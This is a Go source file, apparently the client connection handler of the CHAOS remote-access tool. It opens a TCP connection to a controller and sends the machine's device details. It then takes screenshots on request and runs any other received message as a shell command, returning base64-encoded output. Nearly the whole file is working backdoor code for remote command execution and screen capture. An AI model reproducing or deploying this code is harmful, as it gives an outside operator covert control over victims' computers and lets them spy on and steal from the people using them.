package connection

import (
	"bufio"
	"encoding/base64"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"net"
	"strings"
)

var Delimiter string = "\n"

type ConnectionHandler struct {
	Connection net.Conn
}

func NewConnectionHandler(address, port string) handler.Handler {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		log.Fatal(err)
	}

	return &ConnectionHandler{
		Connection: conn,
	}
}

func (c ConnectionHandler) Handle() error {
	device, err := util.Encode(util.LoadDeviceSpecs())
	if err != nil {
		log.WithField("cause", err.Error()).Error("error encoding device specs")
		return err
	}
	if err := c.Write(string(device)); err != nil {
		log.WithField("cause", err.Error()).Error("error writing device specs")
		return err
	}

	for {
		message, err := bufio.NewReader(c.Connection).ReadString('\n')
		if err != nil {
			log.WithField("cause", err.Error()).Error("error reading from connection")
			continue
		}

		switch strings.TrimSpace(message) {
		case "get_device":
			device, _ := util.PrettyEncode(util.LoadDeviceSpecs())
			c.EncodeAndSend(device)
		case "screenshot":
			screenshot, _ := util.TakeScreenshot()
			c.EncodeAndSend(screenshot)
		default:
			fmt.Print("Message from server: " + message)
			response := util.RunCmd(message, 10)
			c.EncodeAndSend(response)
		}
	}
}

func (c ConnectionHandler) EncodeAndSend(data []byte) {
	encoded := base64.StdEncoding.EncodeToString(data)
	if err := c.Write(encoded); err != nil {
		log.WithField("cause", err.Error()).Error("error writing command data")
	}
}

func (c ConnectionHandler) Write(v string) error {
	_, err := c.Connection.Write([]byte(v + Delimiter))
	return err
}
